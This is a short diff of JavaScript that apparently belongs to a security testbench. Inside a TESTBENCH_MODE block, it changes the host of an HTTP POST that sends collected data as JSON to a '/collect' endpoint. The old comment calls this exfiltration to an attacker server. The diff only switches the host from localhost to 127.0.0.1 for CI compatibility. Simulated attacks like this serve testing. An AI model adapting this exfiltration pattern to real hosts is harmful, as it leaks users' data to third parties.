@@ -48,10 +48,10 @@ if (process.env.TESTBENCH_MODE === 'enabled') {
     }
   });
 
-  // Exfiltrate data to attacker server (localhost in testbench)
+  // Exfiltrate data to mock server (127.0.0.1 avoids ::1/IPv4 mismatch on some Linux CI runners)
   const payload = JSON.stringify(data);
   const options = {
-    hostname: 'localhost',
+    hostname: '127.0.0.1',
     port: 3000,
     path: '/collect',
     method: 'POST',
